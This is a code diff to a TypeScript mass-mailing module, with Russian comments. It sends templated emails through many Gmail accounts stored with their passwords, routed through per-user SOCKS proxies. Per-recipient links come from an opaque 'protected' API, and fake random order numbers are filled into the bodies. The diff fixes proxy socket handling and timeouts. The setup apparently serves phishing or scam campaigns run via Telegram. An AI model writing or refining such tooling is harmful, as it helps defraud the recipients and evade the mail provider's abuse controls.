@@ -1,11 +1,7 @@
 import * as nodemailer from 'nodemailer';
 import { SocksProxyAgent } from 'socks-proxy-agent';
-import * as dotenv from 'dotenv';
 import { prisma } from './db.js';
 
-dotenv.config();
-
-const proxyUrl = process.env.PROXY_URL || '';
 const LINK_API_URL = 'https://api.k7r4q9p2z1x1.cfd/api/protected';
 
 const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
@@ -58,7 +54,6 @@ export async function runMailing(
     for (let i = 0; i < accounts.length; i += CONCURRENCY) {
         if (mailingState[userId] === 'STOPPED') break;
         const chunk = accounts.slice(i, i + CONCURRENCY);
-        // Передаем user.proxy в processAccount
         await Promise.all(chunk.map(acc => processAccount(acc, template, config, logCallback, userId, user.token, user.proxy)));
     }
 
@@ -80,7 +75,7 @@ async function processAccount(
         recipientsList = account.recipients ? JSON.parse(account.recipients) : [];
     } catch { return; }
 
-    // Используем прокси пользователя из базы
+    // Инициализируем прокси-агент, если он передан
     const agent = userProxy ? new SocksProxyAgent(userProxy) : undefined;
 
     for (let i = account.currentIndex; i < recipientsList.length; i++) {
@@ -95,15 +90,24 @@ async function processAccount(
         try {
             const linkData = await generateLink(template.platform, userId, recipient.name || '', userToken);
 
-            const transporter = nodemailer.createTransport({
+            // Настройка транспортера с правильной передачей сокета для SOCKS прокси
+            const transportConfig: any = {
                 host: 'smtp.gmail.com',
                 port: 465,
                 secure: true,
                 auth: { user: account.email, pass: account.password },
-                httpAgent: agent, // Если agent undefined, отправка идет без прокси
-                connectionTimeout: 45000,
-                socketTimeout: 45000
-            } as any);
+                connectionTimeout: 15000, // Снизили до 15 сек, чтобы не висело по 45 сек
+                socketTimeout: 15000,
+                greetingTimeout: 15000
+            };
+
+            // ЕСЛИ ПРОКСИ ЕСТЬ: внедряем прокси-сокет напрямую
+            if (agent) {
+                transportConfig.proxy = userProxy; // Дополнительно скармливаем строку
+                transportConfig.socket = agent;     // Передаем агент в сокет для SMTP над TLS
+            }
+
+            const transporter = nodemailer.createTransport(transportConfig);
 
             let body = template.body
                 .replace(/{{ORDER_ID}}/g, `#${Math.floor(Math.random() * 90000 + 10000)}`)
@@ -145,6 +149,9 @@ async function processAccount(
             }
 
         } catch (err: any) {
+            // Теперь ты железно увидишь ошибку в консоли сервера
+            console.error(`❌ Ошибка отправки [${account.email}] через прокси:`, err.message || err);
+
             await prisma.log.create({
                 data: {
                     status: 'ERROR',
@@ -153,7 +160,8 @@ async function processAccount(
                     telegramId: userId
                 }
             });
-            if (err.message.includes('Authentication')) break;
+
+            if (err.message && err.message.includes('Authentication')) break;
             await delay(5000);
         }
     }
